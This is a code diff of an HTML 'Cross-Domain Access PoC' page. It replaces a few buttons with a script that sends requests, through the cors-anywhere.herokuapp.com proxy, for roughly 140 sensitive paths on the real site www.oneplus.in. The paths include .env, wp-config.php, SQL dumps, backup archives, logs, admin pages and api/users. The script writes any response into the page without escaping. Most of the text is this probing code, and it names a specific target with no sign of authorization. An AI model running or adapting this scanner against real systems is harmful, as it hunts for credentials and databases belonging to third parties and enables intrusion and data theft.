@@ -1,12 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cross-Domain Access PoC</title>
     <style>
         #output {
             border: 1px solid #ccc;
             margin-top: 10px;
-            height: 400px;
+            height: 800px;
             overflow-y: auto;
             padding: 10px;
         }
@@ -14,29 +16,89 @@
 </head>
 <body>
     <h1>Cross-Domain Access PoC</h1>
-    <button onclick="makeRequest('https://www.oneplus.in/.well-known/security.txt')">Request security.txt</button>
-    <button onclick="makeRequest('https://www.oneplus.in/old_version.php')">Request old_version.php</button>
-    <button onclick="makeRequest('https://www.oneplus.in/test_script.php')">Request test_script.php</button>
-    <button onclick="makeRequest('https://www.oneplus.in/config.php.bak')">Request config.php.bak</button>
-    <button onclick="makeRequest('https://www.oneplus.in/database.sql')">Request database.sql</button>
+    <button onclick="makeRequests()">Request Common Internal Files</button>
     <div id="output"></div>
 
     <script>
-        function makeRequest(url) {
-            fetch('https://cors-anywhere.herokuapp.com/' + url)
-                .then(response => {
-                    if (response.ok) {
-                        return response.text();
-                    }
-                    throw new Error('Network response was not ok.');
-                })
-                .then(data => {
-                    document.getElementById("output").innerHTML += `<h3>Response from ${url}:</h3><div>${data}</div><hr/>`;
-                })
-                .catch(error => {
-                    console.error("Error fetching data:", error);
-                    document.getElementById("output").innerText += `Error fetching data from ${url}: ${error.message}<br/>`;
-                });
+        const files = [
+            'config.php', 'wp-config.php', 'database.sql', 'config.inc.php', 
+            'old_version.php', 'test_script.php', 'admin/', 'uploads/', 
+            'favicon.ico', 'robots.txt', 'sitemap.xml', 'error.log', 
+            'access.log', 'backup.sql', 'version.txt', 'sample.json', 
+            '.env', '.htaccess', 'index.html.bak', 'settings.php', 
+            'logs/debug.log', 'logs/error.log', 'readme.txt', 
+            'changelog.txt', 'api/status', 'api/products', 
+            'api/users', 'api/cart', 'api/orders', 'admin/config.php', 
+            'admin/settings.php', 'admin/users.php', 'admin/dashboard.php', 
+            'admin/manage.php', 'admin/login.php', 'old/index.html', 
+            'old/index.php', 'uploads/test.txt', 'uploads/sample.jpg', 
+            'uploads/example.png', 'files/uploads/test.doc', 
+            'files/backups/backup.zip', 'backup/backup.sql', 
+            'config/config.yaml', 'config/config.json', 
+            'config/default.config', 'system/logs/access.log', 
+            'system/logs/error.log', 'cache/tmp.cache', 
+            'cache/session.cache', 'cache/files.cache', 
+            'tmp/tempfile.txt', 'temp/tempfile.tmp', 
+            'scripts/old_script.js', 'scripts/test.js', 
+            'scripts/example.js', 'scripts/debug.js', 'test.php', 
+            'test.html', 'status.html', 'info.php', 'version.php', 
+            'info.json', 'data.json', 'test_data.json', 
+            'uploads/temp/file.txt', 'uploads/logs/log.txt', 
+            'uploads/backups/config.bak', 'uploads/config.bak', 
+            'backup.tar.gz', 'backup.zip', 'dump.sql', 
+            'system/version.txt', 'system/README.md', 
+            'version_history.txt', 'project-info.txt', 
+            'old_versions/index.html', 'old_files/readme.txt', 
+            'assets/docs/api-docs.html', 'assets/docs/manual.pdf', 
+            'assets/img/logo.png', 'assets/css/style.css', 
+            'system/settings/config.php', 'app/config/app.php', 
+            'app/config/database.php', 'local.env', 'test/.env', 
+            'old_backups/backup.sql', 'tmp/uploads/tempfile.tmp', 
+            'temp/session.cache', 'temp/cache.tmp', 
+            'bin/version', 'bin/old_script.sh', 
+            'scripts/legacy_script.py', 'assets/js/libs/jquery.js', 
+            'assets/css/style.css.map', 'assets/js/app.js.map', 
+            'assets/images/old_logo.png', 'assets/icons/favicon.ico', 
+            'uploads/backup.zip', 'uploads/old_file.bak', 
+            'config/settings.json', 'config/appsettings.json', 
+            'data/database.bak', 'data/temp/logs.txt', 
+            'old/temp/tempfile.tmp', 'private/.htaccess', 
+            'private/.env', 'public/index.php.bak', 
+            'public/index_old.php', 'src/config/config.php', 
+            'src/logs/error.log', 'src/logs/access.log', 
+            'src/backups/backup.tar.gz', 'src/backups/old_backup.zip', 
+            'src/README.md', 'src/CHANGELOG.md', 'docs/manual.pdf', 
+            'docs/README.md', 'docs/installation.md', 
+            'tests/test_file.txt', 'tests/debug.log', 
+            'tests/test_config.php', 'tests/sample_test.php', 
+            'cache/test.cache', 'cache/session.lock', 
+            'old/legacy_code.php', 'old/backup/old_backup.sql', 
+            'backups/2022-01-01_backup.sql', 'backups/backup_latest.zip', 
+            'uploads/documents/test_document.pdf', 
+            'uploads/images/test_image.jpg', 'uploads/archives/archive.zip',
+            'scripts/test_script.bat', 'scripts/legacy/old_script.bat'
+        ];
+
+        function makeRequests() {
+            const baseUrl = 'https://www.oneplus.in/';
+            const outputDiv = document.getElementById("output");
+            outputDiv.innerHTML = ''; // Clear previous output
+
+            files.forEach(file => {
+                fetch(`https://cors-anywhere.herokuapp.com/${baseUrl}${file}`)
+                    .then(response => {
+                        if (response.ok) {
+                            return response.text();
+                        }
+                        throw new Error('Not found');
+                    })
+                    .then(data => {
+                        outputDiv.innerHTML += `<h3>Response from ${file}:</h3><div>${data}</div><hr/>`;
+                    })
+                    .catch(error => {
+                        // Optionally log errors or handle them if needed
+                    });
+            });
         }
     </script>
 </body>
